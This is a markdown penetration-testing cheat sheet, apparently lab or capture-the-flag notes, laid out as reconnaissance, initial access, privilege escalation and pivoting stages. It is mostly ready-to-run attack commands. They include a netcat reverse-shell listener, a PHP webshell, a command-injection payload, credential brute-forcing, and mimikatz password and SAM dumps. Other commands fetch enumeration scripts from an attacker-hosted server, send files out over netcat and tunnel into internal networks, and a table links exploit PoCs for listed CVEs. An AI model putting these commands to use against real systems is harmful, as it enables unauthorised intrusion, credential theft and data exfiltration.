# STAGE 1 - RECONNAISSANCE
## Ping sweep
	ip a
List interfaces  

	nmap -sn 123.123.123.0/24
Host discovery  

## General portscan
	nmap -p- --min-rate=1000 -T4 -oN output.txt 123.123.123.123
Flags: All ports, rapid, aggressive, results to output.txt  
Reduce T value or skip min-rate for unstable/slow networks  

	nmap -Pn -sT 123.123.123.123
Flags: Skip ping, basic TCP scan  

	nmap -g53 123.123.123.123
Flags: Source port 53 (may bypass some filtering rules)  

## Versioning portscan
	nmap -p 100,200 -sC -sV -oN output-version.txt 123.123.123.123
Flags: Ports 100,200, NSE script, check version, results to output.txt  

## UDP portscan
UDP is a pain to portscan because a response is not obligatory  

	nmap -sUV -F 123.123.123.123
Flags: Scan udp, check version, only check most common 100 UDP ports  
Open: response obtained. Open|Filtered: unknown.  

	udpx -t 123.123.123.123 -c 128 -w 1000
Flags: 128 concurrent checks, timeout after 1000 ms  

## Exploit Search
    searchsploit "service-version"

# STAGE 2 - INITIAL ACCESS
## Netcat Shell Catching
	nc -lvnp 5000
Flags: listen mode, verbose, no DNS, on port 5000  
Victim machine must be configured to send a shell to the attacker on this port  

	https://www.revshells.com/
.  

## Webservers
### Webscan
	sudo nmap -sV --script http-enum -p 80,443 123.123.123.123
Enum with nmap  

	nikto -h http://123.123.123.123
Basic webscan  

	sudo nano /etc/nikto.conf
To use nikto with cookies  

### Fingerprinting
	nikto -h http://123.123.123.123 -Tuning b
Software identification only  

	curl -I http://123.123.123.123
Header only  

### Directory Enumeration
	gobuster dir -u http://123.123.123.123 -w directory-list-2.3-small.txt -x .php,.txt,.bak,.config,.py -o gobuster-output.txt
Flags: Use directory namelist, find extensions, save results  

	ffuf -u http://targeturl.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403,404
Directory fuzz, filter responses codes 403 & 404  

	ffuf -u http://targeturl.com -H "Host: FUZZ.targeturl.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
Virtual host fuzz, filter responses to 3 words  

	ffuf -u http://FUZZ.targeturl.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
Subdomain fuzz  

	ffuf -u http://targeturl.com/FUZZ -w /wordlist.txt -b "PHPSESSID=33ptqlqcbf3odc4a9e0l1qa65d"
Fuzz with cookie  

### Webshells
	<?php system("whoami")?>
PHP webshell  

### Magic hashes
PHP Loose comparison with magic hashes (0e...)  
Set inputs to 0  

## Injections
### Commands injections
	...; id #
Include # to comment out code behind  

## MSSQL
### mssqlpwner
	mssqlpwner domain/user:password@123.123.123.123 interactive
Flags: Connect to SQL server in interactive shell  

	mssqlpwner domain/user:password@123.123.123.123 direct-query "execute as login = appdev;use databasename;select * from users"
Flags: Execute direct query, impersonate as appdev, dump users table  
### nxc
	nxc mssql 123.123.123.123 -u user -p password --rid-brute > rid-output.txt
Flags: Domain username RID bruteforce, save results  


## Password Cracking
### MD5 Rainbow Table
If the hash contains 32-char hex,  

    https://crackstation.net/
### Hash bruteforce
	hashcat -m 10000 hash.txt passlist.txt
Flags: Use module 10000, crack hash.txt, use passlist.txt  


## Compromised User Access
### SSH
	ssh user@123.123.123.123

### WinRM
	evil-winrm -i 123.123.123.123 -u username -p password

### nxc
	nxc <proto> 123.123.123.123 --port 8000 -u <filename|name> -p <filename|name> --continue-on-success
Bruteforce usernames and passwords via the protocol on port 8000  

### SMB
	smbclient -L //123.123.123.123 -U username%password
List shares  

	impacket-psexec username:password@123.123.123.123
Use `\` to escape special characters in password. Requires admin  

# STAGE 3 - PRIVILEGE ESCALATION
## Weakness Enumeration (Linpeas/Winpeas)
From attacker, `cd` to directory of enumerator  

    python3 -m http.server 80
Host python webserver containing enumerator for victim  

### From victim,
### Linpeas
	curl -o linpeas.sh 10.10.10.10/linpeas.sh
Download the enumerator from your webserver  
  
	sh linpeas.sh > linpeas-output.txt
Run the script and save results  
### Winpeas
	Invoke-WebRequest -Uri 'http://10.10.10.10/WinPEASx64.exe' -OutFile '.\winpeas.exe'
Download the enumerator from your webserver  
Wrap in `powershell -c "Invoke-Web..."` if needed  

	./winpeas.exe > winpeas-output.txt
Run the script and save results  

## Windows - file transfer
	[Convert]::ToBase64String((Get-Content -path "C:\filename" -Encoding byte))
Convert file into clipboard contents  

	[IO.File]::WriteAllBytes("C:\filename", [Convert]::FromBase64String("base64string"))
Write clipboard into file  

## Windows - directory
	tree /f
.  

	dir /s/a/q/n

## Windows - check env
	systeminfo
.  

	whoami /all
.  

	net users
.  

	set
.  

	tasklist /svc

## Windows - services
	sc \\localhost query state= all| findstr SERVICE_NAME
List all services  

	sc qc servicename
Queryconfig service  

	for /f "tokens=2 delims=: " %s in ('sc query state^= all ^| findstr "SERVICE_NAME"') do @(for /f "delims=" %t in ('sc qc "%s" ^| findstr "BINARY_PATH_NAME"') do @echo %s && echo %t)
Show all binary paths  

## Windows - registry
	reg query "HKLM\software\microsoft\windows\currentversion\run" /s
List startup programs  

	reg query "HKLM\software\microsoft\windows\currentversion\runonce" /s
List one-time startup programs  

## Windows - permissions
	icacls filename.ext
Look for F, W, M access  

	icacls . /t /c
List access recursively  

	icacls "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*"

## Windows - mimikatz
	privilege::debug
	sekurlsa::logonpasswords
View logon passwords  

	token::elevate
	lsadump::sam
	lsadump::secrets
LSADump  

	https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file

## Windows - powershell history
	Appdata/roaming/microsoft/windows/Powershell/PSreadline/consolehost_history.txt

## Windows - impersonate token
	https://www.offsec.com/metasploit-unleashed/fun-incognito/

## Linux - file transfer
	cat filename | base64 -w 0;echo
Convert file into clipboard contents  

	echo -n 'base64code' | base64 -d > filename
Save clipboard into file  

	nc -l -p 8000 --recv-only > filename
Save nc contents on port 8000 into filename  

	nc --send-only 123.123.123.123 8000 < filename
Send filename contents into target port 8000 over nc  

## Linux - directory
	tree

## Linux - check powers
	id
	sudo -l

## Linux - services
	ps aux | grep root
List root-running services  

	ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null | awk '!x[$0]++'
List services binary path  

## Linux - permissions
	find / -perm -4000 -type f 2>/dev/null
List SUID files  

	find / -perm -2000 -type f 2>/dev/null
List GUID files  

	find / -perm -2 -type f 2>/dev/null
List world-writable files  

# STAGE 3.5 - PIVOT
## Windows - port forwarding
	netsh interface portproxy add v4tov4 listenport=8000 listenaddress=LISTENIP connectport=7000 connectaddress=CONNECTIP

## Linux - port forwarding
	ssh -L 8000:10.10.1.1:7000 user@123.123.123.123
SSH tunneling, from localhost 8000 through device 123.123.123.123 to internal device 10.10.1.1:7000  
Localhost/123.123.123.1 <--> 123.123.123.123/10.10.10.10 <--> 10.10.1.1    
Afterwards, connect to localhost:8000 to access  

	sysctl net.ipv4.ip_forward
	sudo sysctl -w net.ipv4.ip_forward
Check if iptables forwarding is enabled  

	sudo iptables -t nat -A PREROUTING -i eth0 -o tcp -d LISTENIP --dport 8000 -j DNAT --to-destination CONNECTIP:7000
	sudo iptables -t nat -A POSTROUTING -i eth1 -o tcp -d CONNECTIP --dport 7000 -j SNAT --to-source LISTENIP2
Set pre and post routes, iptables  

## SSH + proxychains
	ssh -D 9050 remoteuser@123.123.123.123
Set a SSH forward on localhost 9050  

	tail /etc/proxychains.conf
Ensure there is a line `socks4 127.0.0.1 9050`

	sudo proxychains nmap -v -Pn -sT INTERNALIP
proxychain nmap portscan on one host  

	proxychains xfreerdp /v:INTERNALIP /u:username /p:password
proxychain rdp connect  

# APPENDIX
## Kali built-in wordlists
### Passwords
	cd /usr/share/wordlists/rockyou.txt.gz
	gzip -d rockyou.txt.gz
Flags: Extract the list from .gz  

### Directories
	/usr/share/wordlists/dirbuster
	/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
Directories  

	/usr/share/seclists/Discovery/Web-Content/web-extensions.txt
Extensions  

	/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
Subdomains  

	/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
GET/POST parameters  

## Seclists
	sudo apt install seclists
	/usr/share/seclists/s
  
## Vulnerabilities
|Software|Version|CVE|Link|
|---|---|---|---|
|Docker Desktop for Windows|4.44.2|CVE-2025-9074|https://github.com/BridgerAlderson/CVE-2025-9074-PoC|
|Cacti|1.2.29|CVE-2025-24367|https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC|
|pkexec||CVE-2021-4034|https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures|
|vsftpd|2.3.4|CVE-2011-2523|https://www.exploit-db.com/exploits/49757|
